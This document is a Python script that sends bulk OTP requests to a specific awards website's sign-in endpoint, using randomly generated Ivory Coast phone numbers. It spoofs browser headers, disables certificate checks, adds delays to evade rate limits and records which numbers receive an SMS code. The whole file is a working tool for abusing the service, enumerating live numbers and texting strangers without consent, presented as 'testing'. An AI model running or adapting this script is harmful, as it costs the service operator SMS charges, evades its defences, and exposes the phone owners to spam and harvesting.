import requests
import time
import random
import json
from fake_useragent import UserAgent
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedOTPTester:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.successful = []
        self.failed = []
        self.invalid_numbers = []
        self.lock = threading.Lock()
        
        # Remove SSL warnings
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )
    
    def validate_phone_format(self, phone):
        """Validate phone number format before sending"""
        # Remove any non-digit characters
        clean_phone = ''.join(filter(str.isdigit, phone))
        
        # Check if it's a valid Ivory Coast number (225 prefix)
        if clean_phone.startswith('225'):
            if len(clean_phone) == 12:  # 225 + 9 digits
                return True, clean_phone
            elif len(clean_phone) == 9:  # Just the 9 digits after 225
                return True, '225' + clean_phone
        elif len(clean_phone) == 9:  # Assume it's Ivory Coast without prefix
            return True, '225' + clean_phone
        
        return False, clean_phone
    
    def get_headers(self):
        """Generate proper headers"""
        return {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,fr;q=0.8",
            "content-type": "application/json",
            "user-agent": self.ua.chrome,
            "origin": "https://pack.chromaawards.com",
            "referer": "https://pack.chromaawards.com/sign-in",
            "sec-ch-ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
    
    def test_phone_validity(self, phone):
        """Test if a phone number is valid for OTP"""
        url = "https://pack.chromaawards.com/otp"
        
        # Validate phone format first
        is_valid, formatted_phone = self.validate_phone_format(phone)
        if not is_valid:
            return "INVALID_FORMAT", "Invalid phone number format"
        
        # Use the properly formatted phone
        payload = {"phoneNumber": f"+{formatted_phone}"}
        headers = self.get_headers()
        
        try:
            # Random delay to avoid rate limiting
            time.sleep(random.uniform(1.5, 3))
            
            response = self.session.post(
                url,
                json=payload,
                headers=headers,
                verify=False,
                timeout=15
            )
            
            return self.analyze_response(response, formatted_phone)
            
        except requests.exceptions.RequestException as e:
            return "NETWORK_ERROR", str(e)
        except Exception as e:
            return "UNKNOWN_ERROR", str(e)
    
    def analyze_response(self, response, phone):
        """Analyze the API response"""
        try:
            response_data = response.json()
            
            if response.status_code == 200:
                return "SUCCESS", "OTP sent successfully"
            
            elif response.status_code == 400:
                error_msg = response_data.get('validationError', '')
                
                if "Could not send OTP" in error_msg:
                    return "INVALID_NUMBER", "Number not supported by service"
                elif "Phone number is required" in error_msg:
                    return "MISSING_NUMBER", "Phone number missing in request"
                else:
                    return "VALIDATION_ERROR", error_msg
            
            elif response.status_code == 429:
                return "RATE_LIMITED", "Too many requests"
            
            elif response.status_code == 500:
                return "SERVER_ERROR", "Server error"
            
            else:
                return f"HTTP_{response.status_code}", response.text[:100]
                
        except json.JSONDecodeError:
            return "INVALID_RESPONSE", "Response not in JSON format"
    
    def process_single_number(self, phone):
        """Process a single phone number"""
        status, message = self.test_phone_validity(phone)
        
        with self.lock:
            if status == "SUCCESS":
                print(f"✅ SUCCESS: +{phone}")
                self.successful.append(phone)
            elif status in ["INVALID_NUMBER", "INVALID_FORMAT"]:
                print(f"❌ INVALID: +{phone} - {message}")
                self.invalid_numbers.append(phone)
            else:
                print(f"⚠️ FAILED: +{phone} - {status}: {message}")
                self.failed.append(phone)
        
        return status
    
    def generate_valid_numbers(self, base_pattern="22507"):
        """Generate potentially valid Ivory Coast numbers"""
        print("🔧 Generating new test numbers...")
        new_numbers = []
        
        # Generate numbers with different patterns
        for i in range(100):
            # Random 7 digits after 22507
            random_suffix = ''.join([str(random.randint(0, 9)) for _ in range(7)])
            new_number = base_pattern + random_suffix
            new_numbers.append(new_number)
        
        return new_numbers
    
    def run_comprehensive_test(self, numbers, max_workers=2):
        """Run comprehensive testing"""
        print(f"🚀 Testing {len(numbers)} numbers...")
        print("📊 This will identify valid vs invalid numbers")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_phone = {
                executor.submit(self.process_single_number, phone): phone 
                for phone in numbers
            }
            
            for future in as_completed(future_to_phone):
                phone = future_to_phone[future]
                try:
                    future.result()
                except Exception as exc:
                    print(f'💥 ERROR: {phone} - {exc}')
    
    def save_results(self):
        """Save comprehensive results"""
        timestamp = int(time.time())
        
        # Save valid numbers for future use
        if self.successful:
            with open("valid_numbers.txt", "w") as f:
                for num in self.successful:
                    f.write(f"{num}\n")
        
        # Save invalid numbers to avoid retesting
        if self.invalid_numbers:
            with open("invalid_numbers.txt", "w") as f:
                for num in self.invalid_numbers:
                    f.write(f"{num}\n")
        
        # Update main numbers file with only failed (not invalid) numbers
        remaining = [num for num in self.failed if num not in self.invalid_numbers]
        with open("numbers.txt", "w") as f:
            for num in remaining:
                f.write(f"{num}\n")
        
        # Save detailed report
        with open(f"comprehensive_report_{timestamp}.txt", "w") as f:
            f.write("📊 COMPREHENSIVE PHONE NUMBER ANALYSIS REPORT\n")
            f.write("=" * 60 + "\n")
            f.write(f"Report Time: {time.ctime()}\n\n")
            
            f.write("SUMMARY:\n")
            f.write(f"Total Tested: {len(self.successful) + len(self.failed) + len(self.invalid_numbers)}\n")
            f.write(f"✅ Valid & Working: {len(self.successful)}\n")
            f.write(f"❌ Invalid Numbers: {len(self.invalid_numbers)}\n")
            f.write(f"⚠️  Failed (Retry): {len(self.failed)}\n")
            f.write(f"📈 Success Rate: {(len(self.successful)/(len(self.successful)+len(self.failed)+len(self.invalid_numbers))*100):.1f}%\n\n")
            
            if self.successful:
                f.write("VALID NUMBERS (OTP Sent Successfully):\n")
                for num in self.successful:
                    f.write(f"+{num}\n")
                f.write("\n")
            
            if self.invalid_numbers:
                f.write("INVALID NUMBERS (Not supported):\n")
                for num in self.invalid_numbers[:50]:  # First 50 only
                    f.write(f"+{num}\n")
                if len(self.invalid_numbers) > 50:
                    f.write(f"... and {len(self.invalid_numbers) - 50} more\n")
                f.write("\n")
            
            if self.failed:
                f.write("FAILED (Network issues - can retry):\n")
                for num in self.failed:
                    f.write(f"+{num}\n")

def main():
    """Main function"""
    tester = AdvancedOTPTester()
    
    # Read numbers
    try:
        with open("numbers.txt", "r") as f:
            numbers = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("❌ numbers.txt not found! Creating sample file...")
        # Generate some sample numbers
        numbers = tester.generate_valid_numbers()
        with open("numbers.txt", "w") as f:
            for num in numbers:
                f.write(f"{num}\n")
        print(f"✅ Created numbers.txt with {len(numbers)} sample numbers")
    
    if not numbers:
        print("❌ No numbers found! Generating new numbers...")
        numbers = tester.generate_valid_numbers()
        with open("numbers.txt", "w") as f:
            for num in numbers:
                f.write(f"{num}\n")
    
    print(f"📱 Loaded {len(numbers)} numbers for testing")
    
    # Run comprehensive test
    start_time = time.time()
    tester.run_comprehensive_test(numbers, max_workers=2)
    end_time = time.time()
    
    # Save results
    tester.save_results()
    
    # Display summary
    print(f"\n{'='*60}")
    print("🎯 COMPREHENSIVE RESULTS")
    print(f"{'='*60}")
    print(f"Total Numbers Tested: {len(numbers)}")
    print(f"✅ Valid & Working: {len(tester.successful)}")
    print(f"❌ Invalid Numbers: {len(tester.invalid_numbers)}")
    print(f"⚠️  Failed (Retry): {len(tester.failed)}")
    print(f"⏱️  Time Taken: {end_time - start_time:.1f} seconds")
    
    if tester.successful:
        print(f"\n🎉 SUCCESS! Found {len(tester.successful)} valid numbers:")
        for phone in tester.successful[:5]:
            print(f"   +{phone}")
        if len(tester.successful) > 5:
            print(f"   ... and {len(tester.successful) - 5} more")
        print(f"✅ Saved to: valid_numbers.txt")
    
    if tester.invalid_numbers:
        print(f"\n💡 Insight: {len(tester.invalid_numbers)} numbers were invalid")
        print("   These numbers are not supported by the service")
        print(f"✅ Saved to: invalid_numbers.txt (to avoid retesting)")
    
    # Suggest next steps
    if len(tester.successful) == 0:
        print(f"\n🔧 RECOMMENDATION:")
        print("   All numbers were invalid. The service might be:")
        print("   - Blocking your IP range")
        print("   - Requiring specific number patterns")
        print("   - Temporarily down")
        print("   Try with different number patterns or wait awhile")

if __name__ == "__main__":
    try:
        import fake_useragent
    except ImportError:
        print("Installing required packages...")
        import subprocess
        subprocess.check_call(["pip", "install", "fake-useragent", "requests"])
    
    main()
